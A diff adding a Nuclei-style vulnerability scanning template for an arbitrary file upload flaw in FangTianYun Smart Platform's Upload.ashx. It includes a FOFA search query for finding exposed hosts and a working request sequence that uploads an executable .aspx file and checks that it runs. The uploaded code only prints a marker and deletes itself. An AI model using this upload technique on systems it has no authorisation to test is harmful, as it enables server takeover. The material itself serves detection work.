@@ -1,0 +1,50 @@
+id: fangdee-upload-file-upload
+
+info:
+  name: FangTianYun Smart Platform System Upload.ashx Arbitrary File Upload
+  author: Co5mos
+  severity: critical
+  description: |
+    FangTianYun Smart Platform System's `Upload.ashx` endpoint has an arbitrary file upload vulnerability that allows attackers to upload malicious files and execute arbitrary code on the server, potentially gaining full control over the web server.
+  metadata:
+    verified: true
+    fofa-query: 'body="AjaxMethods.asmx/GetCompanyItem"'
+  tags: fangtianyun, file-upload, rce
+
+variables:
+  filename: "{{rand_base(6)}}.aspx"
+  boundary: "{{rand_base(34)}}"
+  rand_str: "{{randstr}}"
+
+http:
+  - raw:
+      - |
+        POST /Upload.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----{{boundary}}
+
+        ------{{boundary}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}"
+        Content-Type: image/jpeg
+
+        <%@Page Language="C#"%><%Response.Write("{{rand_str}}");System.IO.File.Delete(Request.PhysicalPath);%>
+        ------{{boundary}}--
+
+      - |
+        GET /UploadFile/CustomerFile/{{path}} HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        part: body
+        name: path
+        regex:
+          - '(.*\.aspx)'
+        internal: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_2 == 200
+          - contains(body_2, '{{rand_str}}')
+        condition: and
